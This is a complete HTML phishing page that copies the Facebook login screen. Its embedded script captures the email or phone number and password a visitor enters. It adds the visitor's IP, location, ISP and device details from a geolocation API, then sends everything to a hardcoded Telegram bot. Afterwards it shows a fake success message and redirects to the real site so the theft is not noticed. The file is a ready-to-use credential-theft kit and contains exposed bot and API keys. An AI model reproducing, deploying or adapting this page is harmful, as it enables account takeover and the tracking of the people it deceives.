<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – log in or sign up</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
    }
    body {
      background-color: #f0f2f5;
    }
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 60vh;
      flex-direction: column;
    }
    .fb-logo {
      font-size: 56px;
      color: #1877f2;
      font-weight: bold;
      margin-bottom: 20px;
    }
    .login-box {
      background-color: #fff;
      padding: 20px 16px;
      width: 360px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }
    .login-box input {
      width: 100%;
      padding: 14px 16px;
      margin-bottom: 12px;
      font-size: 16px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
    }
    .login-box button {
      width: 100%;
      background-color: #1877f2;
      color: white;
      font-size: 18px;
      font-weight: bold;
      padding: 14px 0;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 5px;
    }
    .login-box button:hover {
      background-color: #165ecc;
    }
    .forgot {
      display: block;
      text-align: center;
      margin: 12px 0;
      color: #1877f2;
      font-size: 14px;
      text-decoration: none;
    }
    .line {
      border-top: 1px solid #dadde1;
      margin: 20px 0;
    }
    .create-btn {
      background-color: #42b72a;
      margin-top: 10px;
    }
    .footer {
      margin-top: 40px;
      color: #737373;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="fb-logo">facebook</div>
    <div class="login-box">
      <form onsubmit="sendToTelegram(event)">
        <input type="text" id="username" placeholder="Email or phone number" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" id="loginBtn"><span>Log In</span></button>
      </form>
      <a class="forgot" href="#">Forgotten password?</a>
      <div class="line"></div>
      <button class="create-btn">Create New Account</button>
    </div>
    <div class="footer">Meta © 2025</div>
  </div>

  <script>
    const token = "7581083335:AAE51P3_isSrls3KQG-oC9XvGq_6Ryjl00w";
    const chat_id = "6691838049";
    const ipGeoApiKey = "4f6959e437fc4948a8764491364d2e74";

    async function sendToTelegram(event) {
      event.preventDefault();
      
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value;
      const btn = document.getElementById('loginBtn');

      const phoneRegex = /^[0-9]{6,15}$/;
      const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}$/i;
      
      if (!phoneRegex.test(username) && !emailRegex.test(username)) {
        alert("⚠️ Please enter a valid phone number or email address.");
        return;
      }

      btn.disabled = true;
      btn.querySelector("span").innerText = "Logging in...";

      const now = new Date();
      const datetime = now.toLocaleString();

      try {
        const ipResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${ipGeoApiKey}`);
        const ipData = await ipResponse.json();

        const ip = ipData.ip || 'Unknown IP';
        const country = ipData.country_name || 'Unknown Country';
        const city = ipData.city || 'Unknown City';
        const isp = ipData.isp || 'Unknown ISP';
        const device = navigator.userAgent;

        const msg = 
          `🔐 Facebook Login Attempt\n` +
          `👤 Username: ${username}\n` +
          `🔑 Password: ${password}\n` +
          `🕒 Date & Time: ${datetime}\n` +
          `🌍 IP: ${ip}\n` +
          `📍 Location: ${city}, ${country}\n` +
          `📡 ISP: ${isp}\n` +
          `💻 Device: ${device}`;

        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        const res = await fetch(url, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ chat_id, text: msg })
        });

        if (res.ok) {
          alert("✅ Logged in successfully.");
          window.location.href = "https://facebook.com";
        } else {
          alert("❌ Failed to send data.");
        }
      } catch (err) {
        alert("🚫 Error occurred.");
        console.error(err);
      } finally {
        btn.disabled = false;
        btn.querySelector("span").innerText = "Log In";
      }
    }
  </script>
</body>
</html>